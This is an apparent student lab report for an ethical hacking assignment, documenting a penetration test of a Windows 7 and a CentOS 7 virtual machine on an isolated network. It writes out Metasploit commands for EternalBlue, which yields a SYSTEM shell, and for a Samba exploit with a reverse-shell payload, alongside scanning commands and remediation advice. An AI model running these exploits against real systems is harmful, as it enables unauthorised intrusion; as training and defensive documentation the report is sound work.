# Penetration Testing — Lab Report & Walkthrough

**Project:** Assignment 2 – Ethical Hacking  
**Tester:** Mudapaka Sailaxman  
**Date:** 30 July 2025  
**Network range:** `192.168.2.0/24`

---

## Table of contents
1. [Overview](#overview)  
2. [Goals & Scope](#goals--scope)  
3. [Lab Setup](#lab-setup)  
4. [Tools](#tools)  
5. [Methodology](#methodology)  
6. [Target 1 — Windows 7 (192.168.2.120)](#target-1---windows-7-1921682120)  
7. [Target 2 — CentOS 7 (192.168.2.20)](#target-2---centos-7-192168220)  
8. [Results & Evidence](#results--evidence)  
9. [Recommendations & Mitigations](#recommendations--mitigations)  
10. [Future Work / Next Steps](#future-work--next-steps)  
11. [Repository structure](#repository-structure)  
12. [License & Contact](#license--contact)

---

## Overview
This repository contains the documentation and supporting material for a hands-on penetration test performed against two virtual machines on a host-only VMware network. The goal is to demonstrate reconnaissance, exploitation, and post-exploitation techniques in a controlled lab environment and to provide remediation advice.

---

## Goals & Scope
- **Goal:** Identify vulnerabilities and gain access using remote exploitation techniques only.  
- **Scope:** `192.168.2.0/24` — two targets: Windows 7 (`192.168.2.120`) and CentOS 7 (`192.168.2.20`).  
- **Constraints:** Lab-only; no attacks against external networks. All findings are for educational/ethical purposes.

---

## Lab Setup
- **Attacker machine:** Kali Linux — `192.168.2.128`  
- **Target 1:** Windows 7 SP1 — `192.168.2.120`  
- **Target 2:** CentOS 7 — `192.168.2.20`  
- **Network:** VMware (Host-only adapter)

> Note: Do **not** upload VM images or any sensitive credentials to public repos. Replace real credentials with placeholders if including examples.

---

## Tools
- Nmap (port & service discovery)  
- Metasploit Framework (exploit modules)  
- Nikto (web enumeration)  
- Gobuster (directory brute-forcing)  
- netdiscover (ARP host discovery)  
- msfconsole / meterpreter (post-exploitation)  
- Common Linux utilities (nc, curl, wget)

---

## Methodology
1. **Reconnaissance & discovery** — `netdiscover`, `nmap`  
2. **Enumeration** — service banners, web scanning (`nikto`), directory brute force (`gobuster`)  
3. **Exploitation** — Metasploit modules (EternalBlue/MS17-010, Samba attempts)  
4. **Post-exploitation** — `meterpreter` session, `sysinfo`, `whoami`  
5. **Reporting & remediation** — document findings and recommended fixes

---

## Target 1 — Windows 7 (192.168.2.120)

### Summary
- **Open ports:** 135 (msrpc), 139 (netbios-ssn), 445 (microsoft-ds)  
- **Vulnerability found:** MS17-010 (EternalBlue)  
- **Exploit used:** `exploit/windows/smb/ms17_010_eternalblue` (Metasploit)  
- **Result:** Meterpreter session obtained as `NT AUTHORITY\SYSTEM`

### Key commands (examples)
```bash
# discovery
netdiscover -r 192.168.2.0/24

# nmap service scan
nmap -sV 192.168.2.120

# launch Metasploit
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.2.120
set LHOST 192.168.2.128
run

# after session
sessions -i <id>
sysinfo
getuid
```

### Notes
- Always test exploits in a lab. EternalBlue targets unpatched Windows systems — patching is the primary mitigation.
- Include screenshots of `sysinfo` and `whoami` outputs (redact any sensitive lab-only data if publishing).

---

## Target 2 — CentOS 7 (192.168.2.20)

### Summary
- **Open ports:** 22 (SSH), 80 (HTTP), 139/445 (Samba)  
- **Findings:** Outdated Apache (`2.4.6`) and PHP (`5.4.16`), TRACE method enabled, `/reports/` directory listing found  
- **Enumerations used:** `nikto`, `gobuster`  
- **Exploits attempted:** `exploit/multi/samba/usermap_script`, `exploit/linux/samba/is_known_pipename` (both failed)

### Key commands (examples)
```bash
# nmap
nmap -sV 192.168.2.20

# nikto web scan
nikto -h http://192.168.2.20

# directory brute-force
gobuster dir -u http://192.168.2.20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# attempted Samba exploit (example)
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.2.20
set LHOST 192.168.2.128
set PAYLOAD cmd/unix/reverse
run
```

### Notes
- Even when remote code execution fails, enumeration results (directory listings, outdated components) are valuable and may lead to other attack vectors (file disclosure, LFI/RCE via web apps, weak SSH credentials).

---

## Results & Evidence
- See `Penetration_Testing_Report.pdf` for full screenshots and step-by-step evidence.
- Key result: Root/system access to Windows 7 via EternalBlue (meterpreter session).  
- CentOS: informative enumeration; Samba exploits attempted but no shell obtained.

---

## Recommendations & Mitigations
**Windows 7 (MS17-010)**
- Patch systems with MS17-010 security update (or upgrade OS to a supported version).  
- Block/limit SMB (ports 139/445) on network perimeters; use internal segmentation.  
- Implement EDR and monitor SMB-related anomalies.

**CentOS / Web**
- Upgrade Apache and PHP to supported, patched versions.  
- Disable HTTP TRACE method (remove `TraceEnable` or configure server accordingly).  
- Disable directory listings or restrict via proper `Options -Indexes`.  
- Harden Samba (restrict access, disable unused shares, apply latest patches).  
- Use web application firewall (WAF) where appropriate.

**General**
- Keep systems up to date; apply principle of least privilege; maintain asset inventory; periodic vulnerability scanning and patching cadence.

---

## Future Work / Next Steps
- Attempt local privilege escalation on CentOS (misconfigured SUID, kernel exploits depending on environment).  
- Test password policies and SSH defenses (fail2ban, key-based auth).  
- Evaluate internal network segmentation and host-based protections.  
- Automate scans with safe scheduling, and create a remediation ticket example workflow.

---

## Repository structure (suggested)
```
.
├── README.md                      # this file
├── Penetration_Testing_Report.pdf  # full report & screenshots (redacted if public)
├── commands/                       # plaintext commands & session logs (redacted)
│   ├── nmap_targets.md
│   ├── metasploit_notes.md
│   └── nikto_gobuster.md
├── scripts/                        # any helper scripts (nmap wrappers, enumerators)
├── screenshots/                    # screenshots (named, redacted if needed)
├── mitigation/                     # sample remediation configs (apache.conf snippets, samba.conf snippets)
└── LICENSE
```

---

## License & Contact
- **License:** MIT (add a `LICENSE` file if you want others to reuse non-sensitive parts)  
- **Contact:** Add your email or LinkedIn (if you want to be contacted about the repo).  
  - Example: `mailto:your.email@example.com` or `https://www.linkedin.com/in/your-linkedin/`
